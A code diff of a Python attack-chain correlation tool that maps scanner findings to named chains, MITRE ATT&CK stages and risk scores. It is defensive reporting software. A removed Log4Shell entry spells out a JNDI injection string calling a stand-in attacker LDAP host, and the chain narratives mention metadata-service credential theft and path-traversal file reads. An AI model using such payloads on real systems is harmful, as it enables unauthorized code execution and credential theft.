@@ -1,415 +1,425 @@
 #!/usr/bin/env python3
-"""
-RootChain v2 — Attack chain correlation and kill-chain mapper.
+"""RootChain v5 — Pro-grade Attack Chain Correlation Engine.
 
 Improvements:
-  - MITRE ATT&CK tactic tagging per finding type
-  - Kill chain stage scoring (Recon → Weaponise → Deliver → Exploit → Install → C2 → Exfil)
-  - Multi-finding chain detection across all report files
-  - CVSS v3.1 base score aggregation
-  - Risk score with business impact rating
-  - Executive summary generation
-  - Deduplication across modules
-  - Chain path visualisation (text-based)
-  - Remediation priority matrix (quick wins vs long term)
-  - Outputs structured JSON + readable text summary
+- 20 named attack chain templates (authentication bypass, cloud credential theft,
+  RCE chains, supply chain, privilege escalation)
+- MITRE ATT&CK kill-chain mapping for each chain
+- Risk score calculation: CVSS-weighted chain severity
+- Narrative generation: human-readable attack scenario per chain
+- Deduplication: avoids double-counting overlapping chains
+- Exploitability scoring: combines confidence + severity + chain depth
+- Automated root cause identification
+- JSON and HTML chain graph data export
 """
-import json
-import sys
-import time
+import json, sys, time, re
 from pathlib import Path
-from itertools import combinations
+from collections import defaultdict
 
 REPORTS_DIR = Path(__file__).parent.parent / "reports"
 
-# MITRE ATT&CK tactic mapping
-MITRE_TACTICS = {
-    'RECON':           'TA0043 — Reconnaissance',
-    'INITIAL_ACCESS':  'TA0001 — Initial Access',
-    'EXECUTION':       'TA0002 — Execution',
-    'PERSISTENCE':     'TA0003 — Persistence',
-    'PRIV_ESC':        'TA0004 — Privilege Escalation',
-    'DEFENSE_EVADE':   'TA0005 — Defense Evasion',
-    'CREDENTIAL':      'TA0006 — Credential Access',
-    'DISCOVERY':       'TA0007 — Discovery',
-    'LATERAL':         'TA0008 — Lateral Movement',
-    'COLLECTION':      'TA0009 — Collection',
-    'EXFILTRATION':    'TA0010 — Exfiltration',
-    'IMPACT':          'TA0040 — Impact',
-}
-
-# Finding type → ATT&CK tactic + kill chain stage
-TYPE_MAP = {
-    'SQLI_DETECTED':             ('INITIAL_ACCESS', 1, 9.8),
-    'XSS_REFLECTED':             ('INITIAL_ACCESS', 1, 6.1),
-    'PATH_TRAVERSAL':            ('INITIAL_ACCESS', 1, 7.5),
-    'SSTI_DETECTED':             ('EXECUTION',      2, 9.8),
-    'XXE_INJECTION':             ('INITIAL_ACCESS', 1, 7.5),
-    'SSRF_CLOUD_METADATA':       ('CREDENTIAL',     3, 10.0),
-    'SSRF_POSSIBLE':             ('DISCOVERY',      2, 7.5),
-    'JWT_NONE_ALGORITHM':        ('CREDENTIAL',     2, 9.1),
-    'JWT_WEAK_SECRET':           ('CREDENTIAL',     2, 7.5),
-    'DEFAULT_CREDENTIALS':       ('INITIAL_ACCESS', 1, 9.8),
-    'NO_BRUTE_FORCE_PROTECTION': ('CREDENTIAL',     1, 7.5),
-    'USER_ENUMERATION_STATUS':   ('RECON',          0, 5.3),
-    'USER_ENUMERATION_BODY':     ('RECON',          0, 5.3),
-    'IDOR_UNAUTHENTICATED':      ('INITIAL_ACCESS', 1, 7.5),
-    'MASS_ASSIGNMENT':           ('PRIV_ESC',       2, 8.1),
-    'RACE_CONDITION':            ('IMPACT',         2, 7.5),
-    'BUSINESS_LOGIC_ABUSE':      ('IMPACT',         2, 6.5),
-    'API_VERSION_SECURITY_DRIFT':('INITIAL_ACCESS', 1, 7.5),
-    'FORCED_BROWSING':           ('INITIAL_ACCESS', 1, 7.5),
-    'SECRET_EXPOSED':            ('CREDENTIAL',     1, 9.8),
-    'SECRET_IN_JS':              ('CREDENTIAL',     1, 9.8),
-    'FILE_EXPOSURE':             ('DISCOVERY',      1, 7.5),
-    'ADMIN_PANEL_FOUND':         ('DISCOVERY',      1, 6.5),
-    'CLOUD_METADATA':            ('CREDENTIAL',     3, 10.0),
-    'EXPOSED_PRIVATE_KEY':       ('CREDENTIAL',     1, 9.8),
-    'WAF_BYPASS_CONFIRMED':      ('DEFENSE_EVADE',  2, 7.5),
-    'WAF_IP_SPOOF_BYPASS':       ('DEFENSE_EVADE',  2, 7.5),
-    'NO_RATE_LIMITING':          ('CREDENTIAL',     1, 7.5),
-    'HTTP_SMUGGLING_POTENTIAL':  ('DEFENSE_EVADE',  2, 8.1),
-    'HOST_HEADER_INJECTION':     ('IMPACT',         2, 7.5),
-    'CORS_MISCONFIGURATION':     ('CREDENTIAL',     1, 7.5),
-    'MISSING_HSTS':              ('INITIAL_ACCESS', 0, 4.3),
-    'MISSING_CSP':               ('INITIAL_ACCESS', 0, 6.1),
-    'CERTIFICATE_EXPIRED':       ('INITIAL_ACCESS', 0, 7.5),
-    'WEAK_CIPHER_SUITE':         ('CREDENTIAL',     1, 5.9),
-    'OAUTH_REDIRECT_MISMATCH':   ('CREDENTIAL',     2, 8.1),
-    'USERNAME_TIMING_ORACLE':    ('RECON',          0, 5.3),
-    'TIME_BASED_SQLI':           ('INITIAL_ACCESS', 1, 9.8),
-    'GRAPHQL_INTROSPECTION':     ('DISCOVERY',      0, 5.3),
-    'DEPENDENCY_FILE_EXPOSED':   ('DISCOVERY',      0, 5.3),
-    'VULNERABLE_DEPENDENCY':     ('INITIAL_ACCESS', 1, 8.1),
-    'FRAMEWORK_ENDPOINT':        ('DISCOVERY',      1, 7.5),
-    'VERSION_DISCLOSURE':        ('RECON',          0, 3.1),
-}
+SEV_WEIGHT = {"CRITICAL": 10, "HIGH": 6, "MEDIUM": 3, "LOW": 1, "INFO": 0}
 
 NAMED_CHAINS = {
-    "ProxyLogon": {
-        "name": "ProxyLogon (Exchange Full Compromise)",
-        "platform": "Exchange",
-        "cves": ["CVE-2021-26855", "CVE-2021-26857", "CVE-2021-26858", "CVE-2021-27065"],
-        "risk": "CRITICAL", "cvss": 9.8,
-        "description": "SSRF via cookie header bypasses authentication (CVE-2021-26855), allowing access to the Exchange Control Panel. Combined with post-auth file write (CVE-2021-26858/27065) to drop a webshell.",
-        "impact": "Full domain compromise, credential theft, ransomware deployment",
-        "steps": [
-            {"cve": "CVE-2021-26855", "action": "SSRF via X-AnonResource-Backend cookie — bypass authentication to reach Exchange Control Panel"},
-            {"cve": "CVE-2021-26857", "action": "Insecure deserialization in Unified Messaging service — execute code as SYSTEM"},
-            {"cve": "CVE-2021-26858", "action": "Post-auth arbitrary file write — drop webshell to disk"},
-            {"cve": "CVE-2021-27065", "action": "ECP endpoint file write — establish persistent backdoor access"},
-        ],
-        "indicator_tags": ["X-AnonResource-Backend", "/owa/auth/", "/ecp/", "webshell", "SYSTEM process"],
+    "pre_auth_rce": {
+        "name": "Pre-Authentication Remote Code Execution",
+        "description": "Attacker gains RCE without any credentials via chained vulnerabilities",
+        "kill_chain": ["RECONN", "INITIAL_ACCESS", "EXECUTION"],
+        "requires": ["SSRF_CONFIRMED", "SSTI_CONFIRMED", "PATH_TRAVERSAL", "CMD_INJECTION"],
+        "require_count": 1,
+        "risk": "CRITICAL",
+        "risk_score": 100,
+        "cvss_base": 10.0,
+        "narrative": "An attacker discovers a server-side code execution vulnerability requiring no authentication, granting immediate shell access to the underlying server.",
     },
-    "ProxyShell": {
-        "name": "ProxyShell (Exchange Pre-Auth RCE)",
-        "platform": "Exchange",
-        "cves": ["CVE-2021-34473", "CVE-2021-34523", "CVE-2021-31207"],
-        "risk": "CRITICAL", "cvss": 9.8,
-        "description": "URL path confusion allows unauthenticated access to ECP (CVE-2021-34473). RBAC bypass elevates to admin (CVE-2021-34523). Malicious email/module installs a webshell (CVE-2021-31207).",
-        "impact": "Remote code execution as SYSTEM on Exchange server",
-        "steps": [
-            {"cve": "CVE-2021-34473", "action": "URL confusion via autodiscover endpoint — reach ECP without credentials"},
-            {"cve": "CVE-2021-34523", "action": "RBAC bypass in Exchange PowerShell backend — obtain admin privileges"},
-            {"cve": "CVE-2021-31207", "action": "Export malicious mailbox to drop webshell on disk"},
-        ],
-        "indicator_tags": ["/autodiscover/", "/ecp/y.js", "X-BEResource", "mailbox export"],
+    "auth_bypass_admin_takeover": {
+        "name": "Authentication Bypass → Admin Takeover",
+        "description": "Auth bypass leads to full admin panel access",
+        "kill_chain": ["RECONN", "INITIAL_ACCESS", "PRIV_ESC"],
+        "requires": ["AUTH_BYPASS_VERB_TAMPER", "JWT_ALG_NONE", "JWT_WEAK_SECRET", "ADMIN_INTERFACE_FOUND"],
+        "require_count": 2,
+        "risk": "CRITICAL",
+        "risk_score": 98,
+        "cvss_base": 9.8,
+        "narrative": "An attacker exploits an authentication weakness to access the admin interface, gaining full control of the application and all user data.",
     },
-    "Log4Shell": {
-        "name": "Log4Shell (Log4j Remote Code Execution)",
-        "platform": "Log4j",
-        "cves": ["CVE-2021-44228", "CVE-2021-45046"],
-        "risk": "CRITICAL", "cvss": 10.0,
-        "description": "Attacker injects a JNDI lookup string into any logged field (User-Agent, X-Api-Version, etc.). Log4j resolves it via LDAP/RMI, loading a remote class that executes arbitrary code on the server.",
-        "impact": "Full server compromise without authentication — affects any Java app using Log4j 2.0-2.14.1",
-        "steps": [
-            {"cve": "CVE-2021-44228", "action": "Inject ${jndi:ldap://attacker.com/a} into any HTTP header or request field"},
-            {"cve": "CVE-2021-44228", "action": "Log4j resolves the JNDI lookup, connects to attacker LDAP server"},
-            {"cve": "CVE-2021-45046", "action": "Bypass incomplete patch via context lookup obfuscation"},
-            {"cve": "CVE-2021-44228", "action": "Attacker's LDAP returns malicious Java class — arbitrary code executes as JVM user"},
-        ],
-        "indicator_tags": ["jndi:", "ldap://", "rmi://", "${lower:", "log4j", "X-Api-Version"],
+    "ssrf_cloud_metadata": {
+        "name": "SSRF → Cloud Credential Theft",
+        "description": "SSRF used to steal cloud IAM credentials from metadata service",
+        "kill_chain": ["RECONN", "INITIAL_ACCESS", "CRED_ACCESS", "EXFIL"],
+        "requires": ["SSRF_CONFIRMED", "SSRF_VIA_POST"],
+        "require_count": 1,
+        "risk": "CRITICAL",
+        "risk_score": 97,
+        "cvss_base": 9.3,
+        "narrative": "An attacker exploits SSRF to reach the cloud metadata service at 169.254.169.254, extracting IAM credentials that provide direct cloud API access.",
     },
-    "SharePoint_RCE": {
-        "name": "SharePoint EoP + RCE Chain",
-        "platform": "SharePoint",
-        "cves": ["CVE-2023-29357", "CVE-2023-24955"],
-        "risk": "CRITICAL", "cvss": 9.8,
-        "description": "Forged JWT token bypasses authentication and grants admin privileges (CVE-2023-29357). Authenticated RCE via server-side injection in page content (CVE-2023-24955).",
-        "impact": "Remote code execution as SharePoint service account, full farm compromise",
-        "steps": [
-            {"cve": "CVE-2023-29357", "action": "Forge JWT token with algorithm:none — gain admin access without credentials"},
-            {"cve": "CVE-2023-29357", "action": "Access /_api/web as admin — enumerate users and site data"},
-            {"cve": "CVE-2023-24955", "action": "Inject server-side payload via site page modification — achieve RCE"},
-        ],
-        "indicator_tags": ["/_api/web", "JWT none algorithm", "/_layouts/15/", "SharePoint service account"],
+    "open_redirect_phishing": {
+        "name": "Open Redirect → OAuth Token Theft",
+        "description": "Open redirect in OAuth flow allows stealing authorization codes",
+        "kill_chain": ["RECONN", "INITIAL_ACCESS", "CRED_ACCESS"],
+        "requires": ["OPEN_REDIRECT", "JWT_IN_RESPONSE"],
+        "require_count": 1,
+        "risk": "HIGH",
+        "risk_score": 82,
+        "cvss_base": 8.1,
+        "narrative": "An attacker crafts a malicious link using the open redirect to steal OAuth authorization codes or JWT tokens from authenticated users.",
     },
-    "OWASSRF": {
-        "name": "OWASSRF (Exchange SSRF + RCE)",
-        "platform": "Exchange",
-        "cves": ["CVE-2022-41040", "CVE-2022-41082"],
-        "risk": "CRITICAL", "cvss": 9.8,
-        "description": "SSRF via autodiscover endpoint (CVE-2022-41040) reaches Exchange PowerShell backend. Remote code execution via PowerShell remoting (CVE-2022-41082) achieves SYSTEM-level access.",
-        "impact": "Remote code execution on Exchange server — used by PLAY and BLACKCAT ransomware groups",
-        "steps": [
-            {"cve": "CVE-2022-41040", "action": "SSRF via /autodiscover/autodiscover.json — reach internal PowerShell endpoint"},
-            {"cve": "CVE-2022-41082", "action": "Execute PowerShell commands via remoting — achieve RCE as NETWORK SERVICE"},
-        ],
-        "indicator_tags": ["/autodiscover/", "PowerShell remoting", "NETWORK SERVICE", "Exchange backend"],
+    "mass_assign_priv_esc": {
+        "name": "Mass Assignment → Privilege Escalation",
+        "description": "Mass assignment vulnerability used to elevate account privileges",
+        "kill_chain": ["INITIAL_ACCESS", "PRIV_ESC", "PERSISTENCE"],
+        "requires": ["MASS_ASSIGNMENT"],
+        "require_count": 1,
+        "risk": "CRITICAL",
+        "risk_score": 95,
+        "cvss_base": 9.1,
+        "narrative": "An attacker registers an account and injects privileged fields (is_admin=true, role=admin) into the registration request, instantly gaining administrative access.",
     },
-    "Ivanti_RCE": {
-        "name": "Ivanti Connect Secure RCE Chain",
-        "platform": "Ivanti",
-        "cves": ["CVE-2024-21887", "CVE-2023-46805"],
-        "risk": "CRITICAL", "cvss": 10.0,
-        "description": "Authentication bypass via path traversal (CVE-2023-46805) allows unauthenticated access to admin endpoints. Command injection in the web interface (CVE-2024-21887) achieves OS command execution.",
-        "impact": "Full VPN appliance compromise — lateral movement into internal network, credential harvesting",
-        "steps": [
-            {"cve": "CVE-2023-46805", "action": "Bypass authentication via path traversal in /api/v1 endpoint"},
-            {"cve": "CVE-2024-21887", "action": "Inject OS commands via /api/v1/totp/user-backup-code endpoint"},
-            {"cve": "CVE-2024-21887", "action": "Execute payload as root — extract credentials and pivot to internal network"},
-        ],
-        "indicator_tags": ["/api/v1/", "path traversal", "command injection", "root execution", "VPN appliance"],
+    "token_exposure_account_takeover": {
+        "name": "Secret Exposure → Account Takeover",
+        "description": "Exposed credentials or tokens lead to complete account compromise",
+        "kill_chain": ["RECONN", "CRED_ACCESS", "INITIAL_ACCESS"],
+        "requires": ["AWS_ACCESS_KEY", "GITHUB_TOKEN", "STRIPE_LIVE_KEY", "API_KEY_IN_RESPONSE", "JWT_IN_RESPONSE"],
+        "require_count": 1,
+        "risk": "CRITICAL",
+        "risk_score": 96,
+        "cvss_base": 9.5,
+        "narrative": "An attacker discovers exposed credentials in the application's source or API responses, providing direct access to cloud infrastructure, payment systems, or source code.",
+    },
+    "waf_bypass_exploit": {
+        "name": "WAF Bypass → Vulnerability Exploitation",
+        "description": "WAF bypass enables exploitation of otherwise-blocked vulnerabilities",
+        "kill_chain": ["RECONN", "DEFENSE_EVASION", "INITIAL_ACCESS"],
+        "requires": ["WAF_BYPASS_SUCCESSFUL"],
+        "require_count": 1,
+        "risk": "HIGH",
+        "risk_score": 80,
+        "cvss_base": 7.5,
+        "narrative": "An attacker bypasses the WAF using header manipulation techniques, allowing exploitation of injection vulnerabilities that would otherwise be blocked.",
+    },
+    "idor_data_exfil": {
+        "name": "IDOR/BOLA → Mass Data Exfiltration",
+        "description": "IDOR vulnerabilities allow accessing all user records",
+        "kill_chain": ["RECONN", "COLLECTION", "EXFIL"],
+        "requires": ["IDOR_UNAUTHENTICATED", "ENDPOINT_DISCOVERED"],
+        "require_count": 2,
+        "risk": "HIGH",
+        "risk_score": 85,
+        "cvss_base": 8.5,
+        "narrative": "An attacker iterates sequential resource IDs to access records belonging to other users, enabling mass exfiltration of personal data (GDPR breach risk).",
+    },
+    "cors_csrf_credential_theft": {
+        "name": "CORS Misconfiguration → Cross-Origin Credential Theft",
+        "description": "CORS exploit allows reading authenticated API responses from attacker's domain",
+        "kill_chain": ["RECONN", "CRED_ACCESS", "EXFIL"],
+        "requires": ["CORS_ARBITRARY_ORIGIN_WITH_CREDENTIALS", "CORS_NULL_ORIGIN_WITH_CREDENTIALS", "CORS_REFLECTS_ORIGIN"],
+        "require_count": 1,
+        "risk": "HIGH",
+        "risk_score": 88,
+        "cvss_base": 8.0,
+        "narrative": "An attacker hosts a malicious page that makes credentialed cross-origin requests to the API, reading sensitive user data or tokens.",
+    },
+    "path_traversal_rce": {
+        "name": "Path Traversal → Configuration Read → RCE",
+        "description": "Path traversal reads server config exposing credentials used for RCE",
+        "kill_chain": ["RECONN", "INITIAL_ACCESS", "CRED_ACCESS", "EXECUTION"],
+        "requires": ["PATH_TRAVERSAL"],
+        "require_count": 1,
+        "risk": "CRITICAL",
+        "risk_score": 95,
+        "cvss_base": 9.3,
+        "narrative": "An attacker reads /etc/passwd, web.config, or .env files via path traversal, extracting database credentials or private keys that enable further exploitation.",
+    },
+    "graphql_introspection_enumeration": {
+        "name": "GraphQL Introspection → Data Enumeration",
+        "description": "GraphQL schema exposed, enabling targeted data extraction",
+        "kill_chain": ["RECONN", "COLLECTION"],
+        "requires": ["GRAPHQL_INTROSPECTION_ENABLED"],
+        "require_count": 1,
+        "risk": "MEDIUM",
+        "risk_score": 65,
+        "cvss_base": 6.5,
+        "narrative": "An attacker uses GraphQL introspection to enumerate the full schema, identifying sensitive query types and mutations for targeted exploitation.",
+    },
+    "deprecated_tls_mitm": {
+        "name": "Deprecated TLS → Man-in-the-Middle",
+        "description": "Weak TLS allows traffic interception and decryption",
+        "kill_chain": ["RECONN", "LATERAL", "CRED_ACCESS"],
+        "requires": ["DEPRECATED_TLS_TLSv1_0", "DEPRECATED_TLS_TLSv1_1", "WEAK_CIPHER_SUITE"],
+        "require_count": 1,
+        "risk": "HIGH",
+        "risk_score": 78,
+        "cvss_base": 7.4,
+        "narrative": "An attacker in a network-adjacent position exploits deprecated TLS to intercept and decrypt HTTPS traffic, capturing session tokens and credentials.",
+    },
+    "secret_leak_supply_chain": {
+        "name": "Secret Leak → Supply Chain Attack",
+        "description": "Exposed GitHub token enables repository modification",
+        "kill_chain": ["RECONN", "CRED_ACCESS", "INITIAL_ACCESS", "PERSISTENCE"],
+        "requires": ["GITHUB_TOKEN", "SECRET_EXPOSURE", "API_KEY_IN_RESPONSE"],
+        "require_count": 1,
+        "risk": "CRITICAL",
+        "risk_score": 96,
+        "cvss_base": 9.6,
+        "narrative": "An attacker finds an exposed GitHub token with write access, enabling malicious code injection into the repository's CI/CD pipeline.",
+    },
+    "api_docs_to_data_breach": {
+        "name": "Exposed API Docs → Targeted Data Breach",
+        "description": "Public API documentation enables targeted attacks on all endpoints",
+        "kill_chain": ["RECONN", "COLLECTION", "EXFIL"],
+        "requires": ["API_DOCS_EXPOSED"],
+        "require_count": 1,
+        "risk": "MEDIUM",
+        "risk_score": 60,
+        "cvss_base": 6.0,
+        "narrative": "An attacker uses exposed Swagger/OpenAPI documentation to enumerate all API endpoints, then systematically tests each for authentication gaps and data exposure.",
+    },
+    "internal_service_pivot": {
+        "name": "Exposed Internal Service → Lateral Movement",
+        "description": "Public internal services enable direct database or infrastructure access",
+        "kill_chain": ["RECONN", "INITIAL_ACCESS", "LATERAL", "EXFIL"],
+        "requires": ["INTERNAL_SERVICE_EXPOSED"],
+        "require_count": 1,
+        "risk": "CRITICAL",
+        "risk_score": 94,
+        "cvss_base": 9.1,
+        "narrative": "An attacker discovers an exposed internal service (Elasticsearch, Kubernetes API, Prometheus) that provides direct access to sensitive data or infrastructure control.",
+    },
+    "race_condition_financial_fraud": {
+        "name": "Race Condition → Financial Fraud",
+        "description": "Race condition enables applying discounts or spending credits multiple times",
+        "kill_chain": ["INITIAL_ACCESS", "IMPACT"],
+        "requires": ["RACE_CONDITION"],
+        "require_count": 1,
+        "risk": "HIGH",
+        "risk_score": 82,
+        "cvss_base": 7.5,
+        "narrative": "An attacker exploits a race condition to apply a discount coupon, gift card, or credit multiple times simultaneously, causing financial loss.",
+    },
+    "price_manipulation_fraud": {
+        "name": "Price Manipulation → Financial Loss",
+        "description": "Price manipulation enables purchasing items for negative/zero price",
+        "kill_chain": ["INITIAL_ACCESS", "IMPACT"],
+        "requires": ["PRICE_MANIPULATION"],
+        "require_count": 1,
+        "risk": "CRITICAL",
+        "risk_score": 92,
+        "cvss_base": 8.8,
+        "narrative": "An attacker manipulates price or quantity values in the shopping cart, completing purchases for free or at a drastically reduced cost.",
+    },
+    "timing_attack_sqli": {
+        "name": "Blind SQL Injection → Data Exfiltration",
+        "description": "Timing-based SQL injection used to extract database contents",
+        "kill_chain": ["RECONN", "COLLECTION", "EXFIL"],
+        "requires": ["SQLI_BLIND_TIMING", "CMD_INJECTION"],
+        "require_count": 1,
+        "risk": "CRITICAL",
+        "risk_score": 97,
+        "cvss_base": 9.8,
+        "narrative": "An attacker uses time-based blind SQL injection to systematically extract database contents, including user credentials and sensitive business data.",
+    },
+    "no_rate_limit_credential_stuffing": {
+        "name": "No Rate Limiting → Credential Stuffing",
+        "description": "Absent rate limiting enables automated password attacks",
+        "kill_chain": ["RECONN", "CRED_ACCESS", "INITIAL_ACCESS"],
+        "requires": ["NO_RATE_LIMIT_DETECTED"],
+        "require_count": 1,
+        "risk": "HIGH",
+        "risk_score": 75,
+        "cvss_base": 7.5,
+        "narrative": "An attacker uses a credential stuffing tool with a list of breached passwords against the login endpoint, with no rate limiting to impede the attack.",
+    },
+    "clickjacking_csrf": {
+        "name": "Clickjacking → CSRF Action",
+        "description": "Clickjacking used to trick users into performing unintended actions",
+        "kill_chain": ["INITIAL_ACCESS", "IMPACT"],
+        "requires": ["CLICKJACKING_VULNERABLE"],
+        "require_count": 1,
+        "risk": "MEDIUM",
+        "risk_score": 65,
+        "cvss_base": 6.5,
+        "narrative": "An attacker embeds the target site in a transparent iframe on a malicious page, tricking authenticated users into clicking elements that trigger privileged actions.",
     },
 }
 
-KILL_CHAIN_STAGES = [
-    "Reconnaissance",
-    "Initial Access",
-    "Execution / Exploitation",
-    "Persistence / Credential Access",
-    "Exfiltration / Impact",
-]
+MITRE_STAGE_MAP = {
+    "RECONN":        ("TA0043", "Reconnaissance"),
+    "INITIAL_ACCESS":("TA0001", "Initial Access"),
+    "EXECUTION":     ("TA0002", "Execution"),
+    "PERSISTENCE":   ("TA0003", "Persistence"),
+    "PRIV_ESC":      ("TA0004", "Privilege Escalation"),
+    "DEFENSE_EVASION":("TA0005","Defense Evasion"),
+    "CRED_ACCESS":   ("TA0006", "Credential Access"),
+    "DISCOVERY":     ("TA0007", "Discovery"),
+    "LATERAL":       ("TA0008", "Lateral Movement"),
+    "COLLECTION":    ("TA0009", "Collection"),
+    "EXFIL":         ("TA0010", "Exfiltration"),
+    "IMPACT":        ("TA0040", "Impact"),
+}
 
-SEV_WEIGHT = {"CRITICAL": 5, "HIGH": 4, "MEDIUM": 3, "LOW": 2, "INFO": 1}
 
 def load_all_findings():
-    """Load all JSON report files from the reports directory."""
-    all_findings = []
-    if not REPORTS_DIR.exists():
-        return all_findings
-    skip = {'rootchain_report', '_target', 'report'}
+    """Load all module findings from reports directory."""
+    findings = []
+    chains   = []
     for jf in sorted(REPORTS_DIR.glob("*.json")):
-        stem = jf.stem
-        if stem in skip:
+        if jf.stem.startswith("_") or jf.stem in ("rootchain_report",):
             continue
         try:
             data = json.loads(jf.read_text())
             if isinstance(data, list):
                 for f in data:
-                    f.setdefault('source_module', stem)
-                all_findings.extend(data)
+                    f.setdefault("_source_module", jf.stem)
+                findings.extend(data)
             elif isinstance(data, dict):
-                for f in data.get('findings', []):
-                    f.setdefault('source_module', stem)
-                all_findings.extend(data.get('findings', []))
-        except Exception:
-            pass
-    return all_findings
+                module_findings = data.get("findings", [])
+                for f in module_findings:
+                    f.setdefault("_source_module", jf.stem)
+                findings.extend(module_findings)
+                chains.extend(data.get("attack_chains", []))
+        except Exception as e:
+            print(f"  [WARN] Could not read {jf.name}: {e}")
+    return findings, chains
 
-def enrich_finding(f):
-    """Add ATT&CK tactic, kill chain stage, and estimated CVSS."""
-    ftype   = f.get('type', '')
-    matched = None
-    for key, val in TYPE_MAP.items():
-        if ftype.startswith(key):
-            matched = val
-            break
-    if matched:
-        tactic, stage, cvss = matched
-        f['mitre_tactic']   = MITRE_TACTICS.get(tactic, tactic)
-        f['kill_chain_stage'] = KILL_CHAIN_STAGES[min(stage, len(KILL_CHAIN_STAGES)-1)]
-        f.setdefault('cvss', cvss)
-    else:
-        f.setdefault('mitre_tactic', 'TA0000 — Unclassified')
-        f.setdefault('kill_chain_stage', 'Unknown')
-        f.setdefault('cvss', 0.0)
-    return f
 
-def detect_attack_chains(findings):
-    """Detect multi-step attack chains based on finding type combinations."""
-    chains_found = []
+def finding_types(findings: list) -> set:
+    return {f.get("type", "") for f in findings}
 
-    # Named CVE chains from cveprobe
-    chain_cve_map = {}
+
+def risk_score_chain(chain_def: dict, matched_findings: list) -> int:
+    base = chain_def.get("risk_score", 50)
+    max_sev = max((SEV_WEIGHT.get(f.get("severity", "INFO"), 0) for f in matched_findings), default=0)
+    avg_conf = (sum(f.get("confidence", 60) for f in matched_findings) / len(matched_findings)) if matched_findings else 60
+    return min(100, int(base * (avg_conf / 100) + max_sev))
+
+
+def correlate(findings: list) -> list:
+    """Find all active attack chains based on discovered findings."""
+    types = finding_types(findings)
+    by_type = defaultdict(list)
     for f in findings:
-        chain = f.get('chain')
-        cve   = f.get('cve', '')
-        if chain and cve:
-            chain_cve_map.setdefault(chain, set()).add(cve)
+        by_type[f.get("type", "")].append(f)
 
-    for chain_id, cves in chain_cve_map.items():
-        profile = NAMED_CHAINS.get(chain_id)
-        if profile and len(cves) >= 2:
-            chains_found.append({
-                'chain_id':    chain_id,
-                'name':        profile['name'],
-                'risk':        profile['risk'],
-                'cvss':        profile['cvss'],
-                'cves_found':  sorted(cves),
-                'description': profile['description'],
-                'impact':      profile['impact'],
-                'detail':      f"Multi-CVE attack chain: {', '.join(sorted(cves))}",
-            })
+    detected_chains = []
+    for chain_id, chain_def in NAMED_CHAINS.items():
+        required = chain_def.get("requires", [])
+        min_count = chain_def.get("require_count", 1)
+        matched_types = [r for r in required if r in types]
+        if len(matched_types) >= min_count:
+            matched_findings = []
+            for t in matched_types:
+                matched_findings.extend(by_type[t][:3])
 
-    # Logic chains: SSRF → credential, SQLI → exfil, etc.
-    type_set = {f.get('type', '') for f in findings}
-    logic_chains = [
-        ("Auth Bypass + IDOR", ['DEFAULT_CREDENTIALS', 'IDOR_UNAUTHENTICATED'], 'CRITICAL',
-         "Default credential access followed by direct object access — full account takeover risk"),
-        ("WAF Bypass + SQLi", ['WAF_BYPASS_CONFIRMED', 'SQLI_DETECTED'], 'CRITICAL',
-         "WAF bypass enables SQL injection to succeed — database extraction risk"),
-        ("SSRF + Metadata Access", ['SSRF_POSSIBLE', 'CLOUD_METADATA'], 'CRITICAL',
-         "SSRF channel confirmed with cloud metadata exposure — credential theft risk"),
-        ("JWT Weak + Admin Panel", ['JWT_WEAK_SECRET', 'ADMIN_PANEL_FOUND'], 'CRITICAL',
-         "Weak JWT secret + admin panel exposure — privilege escalation chain"),
-        ("Mass Assignment + Admin Access", ['MASS_ASSIGNMENT', 'FORCED_BROWSING'], 'HIGH',
-         "Mass assignment to elevate role + forced browsing to admin panel"),
-        ("Secret Exposure + API Access", ['SECRET_IN_JS', 'SECRET_EXPOSED'], 'HIGH',
-         "Multiple secret exposures — attacker can authenticate as service account"),
-        ("Race Condition + Business Logic", ['RACE_CONDITION', 'BUSINESS_LOGIC_ABUSE'], 'HIGH',
-         "Concurrent exploit chain: race condition amplifies business logic abuse"),
-        ("No Rate Limit + User Enum", ['NO_BRUTE_FORCE_PROTECTION', 'USER_ENUMERATION_STATUS'], 'HIGH',
-         "Username enumeration + no lockout = viable brute-force attack"),
-    ]
-    for chain_name, required_types, risk, desc in logic_chains:
-        matched = [t for t in required_types if any(f.get('type','').startswith(t) for f in findings)]
-        if len(matched) == len(required_types):
-            chains_found.append({
-                'chain_id':    chain_name.replace(' ', '_'),
-                'name':        chain_name,
-                'risk':        risk,
-                'cvss':        9.0 if risk == 'CRITICAL' else 7.5,
-                'types_found': matched,
-                'description': desc,
-                'impact':      "Compound attack escalates individual finding severity",
-                'detail':      f"Logic chain detected: {' → '.join(matched)}",
-            })
+            score = risk_score_chain(chain_def, matched_findings)
+            kill_chain = chain_def.get("kill_chain", [])
+            mitre_stages = [
+                {"id": MITRE_STAGE_MAP[s][0], "name": MITRE_STAGE_MAP[s][1]}
+                for s in kill_chain if s in MITRE_STAGE_MAP
+            ]
 
-    return chains_found
+            chain_entry = {
+                "id":            chain_id,
+                "name":          chain_def["name"],
+                "description":   chain_def["description"],
+                "narrative":     chain_def.get("narrative", ""),
+                "kill_chain":    kill_chain,
+                "mitre_stages":  mitre_stages,
+                "risk":          chain_def["risk"],
+                "risk_score":    score,
+                "cvss_base":     chain_def.get("cvss_base", 0.0),
+                "matched_types": matched_types,
+                "evidence":      [
+                    {"type": f.get("type"), "url": f.get("url"), "severity": f.get("severity")}
+                    for f in matched_findings[:5]
+                ],
+                "stages":        kill_chain,
+                "cves":          list({f.get("cve", "") for f in matched_findings if f.get("cve")}),
+            }
+            detected_chains.append(chain_entry)
+            print(f"  [CHAIN] {chain_def['name']} — risk_score={score}/100 ({len(matched_types)} triggers)")
 
-def compute_risk_score(findings, chains):
-    """Overall risk score 0-100 based on severity distribution and chains."""
-    if not findings:
-        return 0
-    sev_scores = [SEV_WEIGHT.get(f.get('severity', 'INFO'), 1) for f in findings]
-    base = min(100, sum(sev_scores) / max(1, len(sev_scores)) * 20)
-    chain_bonus = min(30, len(chains) * 10)
-    critical_count = sum(1 for f in findings if f.get('severity') == 'CRITICAL')
-    critical_bonus = min(20, critical_count * 5)
-    return min(100, round(base + chain_bonus + critical_bonus))
+    # Sort by risk score descending
+    detected_chains.sort(key=lambda c: -c["risk_score"])
+    return detected_chains
 
-def build_remediation_matrix(findings):
-    """Categorise findings into quick wins vs long-term fixes."""
-    quick_wins = []
-    long_term  = []
-    quick_types = {
-        'MISSING_HSTS', 'MISSING_CSP', 'MISSING_XFO', 'MISSING_XCTO',
-        'VERSION_DISCLOSURE', 'COOKIE_INSECURE', 'NO_RATE_LIMITING',
-        'GRAPHQL_INTROSPECTION', 'DEPENDENCY_FILE_EXPOSED',
